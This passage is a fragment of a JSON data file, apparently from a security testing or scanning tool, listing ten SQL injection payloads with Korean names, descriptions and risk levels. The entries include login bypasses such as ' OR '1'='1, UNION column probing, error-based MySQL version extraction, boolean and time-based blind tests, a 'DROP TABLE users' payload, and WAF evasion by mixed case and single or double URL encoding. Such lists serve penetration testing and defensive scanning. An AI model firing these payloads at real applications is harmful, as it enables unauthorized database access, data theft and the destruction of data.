      "icon": "🗄️",
      "color": "#e74c3c",
      "payloads": [
        { "id": "sqli_1", "name": "기본 인증 우회", "payload": "' OR '1'='1", "description": "WHERE 절 우회", "risk": "critical" },
        { "id": "sqli_2", "name": "주석 기반 우회", "payload": "' OR 1=1--", "description": "나머지 쿼리 주석 처리", "risk": "critical" },
        { "id": "sqli_3", "name": "UNION SELECT", "payload": "' UNION SELECT null,null,null--", "description": "컬럼 수 탐색", "risk": "high" },
        { "id": "sqli_4", "name": "에러 기반 추출", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "description": "MySQL 버전 정보 추출", "risk": "high" },
        { "id": "sqli_5", "name": "Blind - Boolean", "payload": "' AND 1=1--", "description": "Boolean 기반 Blind SQLi", "risk": "medium" },
        { "id": "sqli_6", "name": "Blind - Time", "payload": "'; WAITFOR DELAY '0:0:5'--", "description": "MSSQL 시간 지연", "risk": "medium" },
        { "id": "sqli_7", "name": "DROP TABLE", "payload": "'; DROP TABLE users--", "description": "테이블 삭제 시도", "risk": "critical" },
        { "id": "sqli_8", "name": "대소문자 우회", "payload": "' oR '1'='1", "description": "WAF 대소문자 필터 우회", "risk": "high" },
        { "id": "sqli_9", "name": "URL 인코딩 우회", "payload": "%27%20OR%20%271%27%3D%271", "description": "URL 인코딩 WAF 우회", "risk": "high" },
        { "id": "sqli_10", "name": "더블 인코딩", "payload": "%2527%2520OR%25201%253D1", "description": "이중 URL 인코딩", "risk": "high" }
      ]
    },
    {
